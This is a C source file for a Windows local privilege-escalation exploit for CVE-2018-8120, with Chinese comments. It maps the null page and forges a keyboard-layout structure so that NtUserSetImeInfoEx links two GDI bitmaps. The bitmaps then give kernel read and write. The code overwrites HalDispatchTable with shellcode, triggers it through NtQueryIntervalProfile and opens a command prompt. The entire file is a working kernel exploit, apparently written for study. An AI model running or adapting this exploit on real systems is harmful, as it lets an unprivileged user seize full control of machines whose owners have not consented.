#include<stdio.h>
#include<Windows.h>
#include<Psapi.h>
#include "Struct.h"

My_NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
HBITMAP hManagerBitmap = NULL;
HBITMAP hWorkerBitmap = NULL;
HBITMAP pManagerPrvScan0 = NULL;
HBITMAP pWorkerPrvScan0 = NULL;
tagIMEINFOEX iiFaked;
HWND hwndHunt = NULL;
PVOID pwndHunt = NULL;


static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

DWORD64 ntoskrnlbase()
{
	LPVOID lpImageBase[0x100];
	LPDWORD lpcbNeeded = NULL;
	TCHAR lpfileName[1024];

	//Retrieves the load address for each device driver in the system
	EnumDeviceDrivers(lpImageBase, (DWORD64)sizeof(lpImageBase), lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, 0x40);

		if (!strcmp((LPSTR)lpfileName, "ntoskrnl.exe"))
		{
			return lpImageBase[i];
		}
	}
	return NULL;
}

DWORD64 GetHalOffset_8()
{
	// ntkrnlpa.exe in kernel space base address
	DWORD64 pNtkrnlpaBase = ntoskrnlbase();
	printf("[+] ntkrnlpa base address is 0x%p\n", pNtkrnlpaBase);
	// ntkrnlpa.exe in user space base address
	HMODULE hUserSpaceBase = LoadLibraryA("ntoskrnl.exe");

	// HalDispatchTable in user space address
	DWORD64 pUserSpaceAddress = (DWORD64)GetProcAddress(hUserSpaceBase, "HalDispatchTable");

	DWORD64 hal_8 = (DWORD64)pNtkrnlpaBase + ((DWORD64)pUserSpaceAddress - (DWORD64)hUserSpaceBase) + 0x8;

	printf("[+] Hook address is 0x%p\n", hal_8);

	return (DWORD64)hal_8;
}

VOID init_addr()
{
	// 申明函数
	*(FARPROC*)& NtAllocateVirtualMemory = GetProcAddress(
		GetModuleHandleW(L"ntdll"),
		"NtAllocateVirtualMemory");

	if (NtAllocateVirtualMemory == NULL)
	{
		printf("[+] Failed to get function NtAllocateVirtualMemory!!!\n");
		system("pause");
		return 0;
	}

	// 零页申请内存
	PVOID Zero_addr = (PVOID)1;
	SIZE_T RegionSize = 0x1000;

	printf("[+] Started to alloc zero page");
	if (!NT_SUCCESS(NtAllocateVirtualMemory(
		INVALID_HANDLE_VALUE,
		&Zero_addr,
		0,
		&RegionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE)) || Zero_addr != NULL)
	{
		printf("[+] Failed to alloc zero page!\n");
		system("pause");
		return 0;
	}

	ZeroMemory(Zero_addr, RegionSize);
	printf(" => done!\n");
}

DWORD64 getGdiShreadHandleTableAddr()
{
	DWORD64 tebAddr = (DWORD64)NtCurrentTeb();
	DWORD64 pebAddr = *(PDWORD64)((PUCHAR)tebAddr + 0x60);
	DWORD64 GdiShreadHandleTableAddr = *(PDWORD64)((PUCHAR)pebAddr + 0xf8);
	return GdiShreadHandleTableAddr;
}

DWORD64 getBitMapAddr(HBITMAP hBitmap)
{
	WORD arrayIndex = LOWORD(hBitmap);
	return *(PDWORD64)(getGdiShreadHandleTableAddr() + arrayIndex * 0x18);
}

VOID readOOB(DWORD64 whereRead, LPVOID whatValue, int len)
{
	SetBitmapBits(hManagerBitmap, len, &whereRead);
	GetBitmapBits(hWorkerBitmap, len, whatValue);	// read
}

VOID writeOOB(DWORD64 whereWrite, LPVOID whatValue, int len)
{
	SetBitmapBits(hManagerBitmap, len, &whereWrite);
	SetBitmapBits(hWorkerBitmap, len, &whatValue);	// write
}

VOID Construct_Fake()
{
	tagIMEINFOEX fakepiiex = { 0 };

	printf("[+] Start to Create WindowStation");
	// 新建一个新的窗口,新建的WindowStation对象其偏移0x14位置的spklList字段的值默认是零
	HWINSTA hSta = CreateWindowStation(
		0,				//LPCSTR                lpwinsta
		0,				//DWORD                 dwFlags
		READ_CONTROL,	//ACCESS_MASK           dwDesiredAccess
		0				//LPSECURITY_ATTRIBUTES lpsa
	);

	printf(" => done!\n");

	printf("[+] Start to SetProcessWindowStation");
	// 窗口与当前进程关联起来
	SetProcessWindowStation(hSta);

	printf(" => done!\n");

	CHAR buf[0x64 * 0x64 * 4];

	hManagerBitmap = CreateBitmap(0x101, 2, 1, 8, &buf);
	hWorkerBitmap = CreateBitmap(0x101, 2, 1, 8, &buf);
	//__debugbreak();
	DWORD64 leakManagerAddr = getBitMapAddr(hManagerBitmap);
	DWORD64 leakWorkerAddr = getBitMapAddr(hWorkerBitmap);

	printf("[+] hManagerBitmap address is 0x%p\n", leakManagerAddr);
	printf("[+] leakWorkerAddr address is 0x%p\n", leakWorkerAddr);

	pManagerPrvScan0 = leakManagerAddr + 0x50;
	pWorkerPrvScan0 = leakWorkerAddr + 0x50;

	printf("[+] pManagerPrvScan0 address is : 0x%p\n", pManagerPrvScan0);
	printf("[+] pWorkerPrvScan0 address is : 0x%p\n", pWorkerPrvScan0);
	//__debugbreak();

	DWORD64* faketagKL = (DWORD64*)0x0;
	// 手动构造 pWorkerPrvScan0 结构
	*(DWORD64*)((PBYTE)& fakepiiex + 0x0) =  pWorkerPrvScan0;
	*(DWORD64*)((PBYTE)& fakepiiex + 0x8) =  0x104;
	*(DWORD64*)((PBYTE)& fakepiiex + 0xc) =  0x00001b97;
	*(DWORD64*)((PBYTE)& fakepiiex + 0x10) = 0x00000003;
	*(DWORD64*)((PBYTE)& fakepiiex + 0x18) = 0x00010000;
	*(DWORD64*)((PBYTE)& fakepiiex + 0x20) = 0x04800200;
	printf("[+] piiex address is : 0x%p\n", fakepiiex); // pWorkerPrvScan0
	printf("[+] &piiex address is : 0x%p\n", &fakepiiex);
	printf("[+] faketagKL address is : 0x%p\n", faketagKL);
	// 绕过检验
	*(DWORD64*)((PUCHAR)faketagKL + 0x28) = pWorkerPrvScan0;  // tagKL->hkl
	*(DWORD64*)((PUCHAR)faketagKL + 0x50) = pManagerPrvScan0; // tagKL->piiex
	//__debugbreak();
	NtUserSetImeInfoEx((PVOID)&fakepiiex); // 拷贝函数实现 pManagerPrvScan0->pWorkerPrvScan0
}

VOID GetShell()
{
	DWORD64 interVal = 0;
	DWORD64 halHooked = GetHalOffset_8();

	NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");
	//__debugbreak();
	writeOOB(halHooked, (PVOID)& ShellCode, sizeof(DWORD64));
	// 1. hManagerPrvScan0->hworkerPrvScan0->HalDispatchTable+0x4
	// 2. hManagerPrvScan0->hworkerPrvScan0->HalDispatchTable+0x4->shellcode

	// 执行shellcode
	NtQueryIntervalProfile(0x1234, &interVal);
}

int main()
{
	printf("[+] CVE-2018-8120\n[+] Write by Thunder_J 2019.8\n");

	init_addr();

	Construct_Fake();

	GetShell();

	CreateCmd();

	system("pause");
	return 0;
}

